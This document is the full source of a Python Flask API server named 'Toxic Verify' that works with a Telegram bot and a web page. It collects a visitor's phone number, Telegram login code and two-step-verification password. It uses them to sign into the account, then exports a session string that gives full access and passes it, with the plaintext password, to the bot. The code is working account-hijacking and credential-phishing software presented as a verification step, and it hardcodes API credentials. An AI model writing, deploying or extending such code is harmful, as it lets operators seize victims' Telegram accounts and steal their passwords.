"""
============================================
 TOXIC VERIFY - Flask API Server
============================================
Runs alongside bot.py
Handles OTP send/verify via Pyrogram
HTML calls this API directly (webapp stays open)
============================================
"""

import os
import json
import asyncio
import logging
from datetime import datetime, timedelta
from flask import Flask, request, jsonify
from flask_cors import CORS
from pyrogram import Client
from pyrogram.errors import (
    SessionPasswordNeeded, PhoneCodeInvalid,
    PhoneCodeExpired, PasswordHashInvalid, FloodWait,
    PhoneNumberInvalid
)

# ============================================
#  CONFIG — must match bot.py
# ============================================
API_ID   = 35307937
API_HASH = "9c6e00f1aec844a2262224bb146ab6c3"

# ============================================
app = Flask(__name__)
CORS(app)  # Allow requests from Vercel domain

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

# In-memory session store  {user_id_str: {client, hash, phone}}
otp_sessions = {}

# ============================================
#  PYROGRAM HELPERS
# ============================================
def run_async(coro):
    """Run async coroutine from sync Flask context"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(coro)
    finally:
        loop.close()


async def _send_otp(phone: str):
    client = Client("sess_" + phone.replace("+",""), api_id=API_ID, api_hash=API_HASH, in_memory=True)
    await client.connect()
    try:
        sent = await client.send_code(phone)
        return {"ok": True, "client": client, "hash": sent.phone_code_hash}
    except FloodWait as e:
        await client.disconnect()
        return {"ok": False, "error": f"Too many attempts. Wait {e.value} seconds."}
    except PhoneNumberInvalid:
        await client.disconnect()
        return {"ok": False, "error": "Invalid phone number format."}
    except Exception as e:
        await client.disconnect()
        return {"ok": False, "error": str(e)}


async def _verify_otp(client, phone, code_hash, code):
    try:
        await client.sign_in(phone_number=phone, phone_code_hash=code_hash, phone_code=code)
        session = await client.export_session_string()
        me = await client.get_me()
        await client.disconnect()
        return {"ok": True, "session": session, "tg_id": me.id, "phone": phone}
    except SessionPasswordNeeded:
        try:
            hint = await client.get_password_hint()
        except:
            hint = ""
        return {"ok": False, "need_2fa": True, "hint": hint or "", "client": client}
    except PhoneCodeInvalid:
        return {"ok": False, "error": "Wrong OTP code. Try again."}
    except PhoneCodeExpired:
        return {"ok": False, "error": "OTP expired. Please go back and try again."}
    except Exception as e:
        return {"ok": False, "error": str(e)}


async def _verify_2fa(client, password, phone):
    try:
        await client.check_password(password)
        session = await client.export_session_string()
        me = await client.get_me()
        await client.disconnect()
        return {"ok": True, "session": session, "tg_id": me.id, "phone": phone}
    except PasswordHashInvalid:
        return {"ok": False, "error": "Wrong 2FA password. Try again."}
    except Exception as e:
        return {"ok": False, "error": str(e)}


# ============================================
#  API ROUTES
# ============================================

@app.route("/ping", methods=["GET"])
def ping():
    return jsonify({"ok": True, "msg": "Toxic Verify API running"})


@app.route("/send-otp", methods=["POST"])
def send_otp():
    body = request.get_json(silent=True) or {}
    phone = body.get("phone", "").strip()
    uid   = str(body.get("user_id", ""))

    if not phone or not uid:
        return jsonify({"ok": False, "error": "Missing phone or user_id"}), 400

    if not phone.startswith("+"):
        phone = "+" + phone

    result = run_async(_send_otp(phone))
    if result["ok"]:
        otp_sessions[uid] = {
            "client": result["client"],
            "hash":   result["hash"],
            "phone":  phone
        }
        log.info(f"OTP sent → uid={uid} phone={phone}")
        return jsonify({"ok": True, "message": "OTP sent to your Telegram app"})
    else:
        return jsonify({"ok": False, "error": result["error"]}), 400


@app.route("/verify-otp", methods=["POST"])
def verify_otp():
    body = request.get_json(silent=True) or {}
    otp  = str(body.get("otp", "")).strip()
    uid  = str(body.get("user_id", ""))

    if not otp or not uid:
        return jsonify({"ok": False, "error": "Missing otp or user_id"}), 400

    if uid not in otp_sessions:
        return jsonify({"ok": False, "error": "Session expired. Go back and try again."}), 400

    sess   = otp_sessions[uid]
    result = run_async(_verify_otp(sess["client"], sess["phone"], sess["hash"], otp))

    if result["ok"]:
        del otp_sessions[uid]
        # Notify bot via shared dict (bot.py imports this module's verified_queue)
        verified_queue[uid] = {
            "session": result["session"],
            "tg_id":   result["tg_id"],
            "phone":   result["phone"],
            "tfa":     None
        }
        log.info(f"OTP verified → uid={uid}")
        return jsonify({"ok": True, "message": "OTP verified!"})

    elif result.get("need_2fa"):
        # Keep client alive for 2FA step
        otp_sessions[uid]["client"] = result["client"]
        otp_sessions[uid]["need_2fa"] = True
        return jsonify({"ok": False, "need_2fa": True, "hint": result["hint"]})

    else:
        return jsonify({"ok": False, "error": result["error"]}), 400


@app.route("/verify-2fa", methods=["POST"])
def verify_2fa():
    body     = request.get_json(silent=True) or {}
    password = body.get("password", "").strip()
    uid      = str(body.get("user_id", ""))

    if not password or not uid:
        return jsonify({"ok": False, "error": "Missing password or user_id"}), 400

    if uid not in otp_sessions or not otp_sessions[uid].get("need_2fa"):
        return jsonify({"ok": False, "error": "Session expired. Go back and try again."}), 400

    sess   = otp_sessions[uid]
    result = run_async(_verify_2fa(sess["client"], password, sess["phone"]))

    if result["ok"]:
        del otp_sessions[uid]
        verified_queue[uid] = {
            "session": result["session"],
            "tg_id":   result["tg_id"],
            "phone":   result["phone"],
            "tfa":     password
        }
        log.info(f"2FA verified → uid={uid}")
        return jsonify({"ok": True, "message": "2FA verified!"})
    else:
        return jsonify({"ok": False, "error": result["error"]}), 400


# Shared queue — bot.py polls this to know when someone verified
verified_queue = {}  # {uid_str: {session, tg_id, phone, tfa}}


if __name__ == "__main__":
    # Run on port 5000
    app.run(host="0.0.0.0", port=5000, debug=False)
